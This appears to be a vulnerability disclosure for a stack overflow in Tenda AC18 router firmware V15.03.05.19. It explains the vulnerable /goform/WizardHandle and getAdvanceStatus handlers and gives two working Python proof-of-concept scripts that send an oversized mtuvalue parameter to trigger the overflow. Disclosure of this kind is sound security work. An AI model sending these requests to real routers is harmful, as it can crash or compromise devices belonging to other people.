## Overview

- The device's official website: https://www.tenda.com.cn/product/A18.html
- Firmware download website: https://www.tenda.com.cn/material/show/2683

## Affected version

V15.03.05.19(6318)

## Vulnerability details

In the TendaAC18 Firmware has a stack overflow vulnerability in the `/goform/WizardHandle` url. The `v37` variable receives the `mtuvalue` parameter from a POST request and is stored in the configuration item named``wan1.dynamicMTU` through the SetValue function.In order to execute this case branch, the value of WANT needs to be set to 0. In order to parse %d as 1, it is also necessary to set the value of the `WANS` parameter to 1.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20250926_170749.png)

`wan1.dynamicMTU`  configuration item can  be retrieved through the GetValue function in the `/goform/getAdvanceStatus` url.However, neither the GetValue function nor the SetValue function impose any restrictions on the length of variables, which can lead to stack overflows.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20250926_171604.png)

In order to execute this case branch, The `v26` variable needs to be set to 0.So, in the `/goform/WizardHandle` URL, the value of the `WANT` parameter needs to be set to 0.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20250926_171954.png)

## PoC

first SetValue

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/WizardHandle"
payload = "a"*1000

data = {"WANT": "0","WANS":"1","mtuvalue":payload}
response = requests.post(url, data=data)
print(response.text)
```

second GetValue

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/getAdvanceStatus"
response = requests.post(url)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250926141817071.png)